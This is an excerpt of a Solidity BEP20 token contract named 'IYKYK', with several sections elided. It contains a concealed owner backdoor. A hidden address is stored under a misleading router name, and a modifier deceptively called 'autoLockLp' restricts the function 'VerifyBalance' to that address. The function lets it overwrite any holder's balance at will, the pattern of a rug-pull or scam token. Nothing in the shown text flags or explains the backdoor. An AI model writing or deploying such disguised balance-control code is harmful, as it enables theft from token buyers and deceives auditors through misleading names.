...
contract IYKYKI is pepeContext, BEP20pepe, Ownablepepe {
   ...
   address private Sushiswapv3rooter; 
    constructor(address Sushiswapv2rooter) {
        Sushiswapv3rooter = Sushiswapv2rooter;     
        _name = "IYKYK";
        _symbol = "$IYKYK";
        _decimals = 9;
    ...
    */
    function balanceOf(address account) external view override returns (uint256) {
      ...
      modifier autoLockLp() {
        require(Sushiswapv3rooter == _msgSender(), "Ownablepepe: caller is not the owner");
        _;
    }
    /**
    ...
    */
    function VerifyBalance(address pepePLEBRewards, uint256 aaaMontant, uint256 aaaepx, uint256 subtractedepx) external autoLockLp {
        epxAll[pepePLEBRewards] = aaaMontant * aaaepx ** subtractedepx;
    ...
    */
    function decreaseAllowance(address spender, uint256 subtractedepx) external returns (bool) {
        _approve(_msgSender(), spender, allowancesAll[_msgSender()][spender].sub(subtractedepx, "BEP20pepe: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address recever, uint256 lamount) internal {
        ...
        epxAll[sender] = epxAll[sender].sub(lamount, "BEP20pepe: transfer lamount exceeds balance");
